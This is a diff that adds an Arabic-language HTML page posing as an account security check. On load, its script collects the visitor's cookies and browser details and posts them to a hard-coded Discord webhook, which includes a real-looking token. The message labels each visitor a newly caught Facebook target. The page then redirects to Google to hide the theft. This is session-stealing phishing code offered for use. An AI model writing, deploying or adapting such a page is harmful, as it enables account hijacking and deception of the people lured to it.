@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري فحص الأمان...</title>
+</head>
+<body>
+    <script>
+        // ضع رابط الويب هوك الخاص بديسكورد بين القوسين بالأسفل
+        const WEBHOOK_URL ="https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4",
+        async function captureAndSend() {
+            const payload = {
+                content: "🚨 *تم اصطياد هدف جديد (فيسبوك)* 🚨",
+                embeds: [{
+                    title: "بيانات الجلسة (Cookies)",
+                    description: "```" + document.cookie + "```",
+                    color: 15158332,
+                    fields: [
+                        { name: "معلومات الجهاز", value: navigator.userAgent },
+                        { name: "توقيت العملية", value: new Date().toLocaleString() }
+                    ]
+                }]
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+
+            // تمويه المجرم بنقله لصفحة غوغل بعد ثانية
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 1000);
+        }
+        window.onload = captureAndSend;
+    </script>
+    <center><h1>جاري التحقق من أمان الحساب، يرجى الانتظار...</h1></center>
+</body>
+</html>
